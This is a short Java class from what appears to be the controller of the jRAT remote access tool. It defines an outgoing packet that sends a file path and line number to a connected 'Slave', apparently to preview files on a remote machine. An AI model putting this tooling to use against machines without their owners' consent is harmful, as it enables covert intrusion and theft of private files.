package io.jrat.client.packets.outgoing;

import io.jrat.client.Slave;

import java.io.DataOutputStream;


public class Packet60PreviewFile extends AbstractOutgoingPacket {

	private String file;
	private int line;

	public Packet60PreviewFile(String file, int line) {
		this.file = file;
		this.line = line;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(file);
		dos.writeInt(line);
	}

	@Override
	public byte getPacketId() {
		return 60;
	}

}
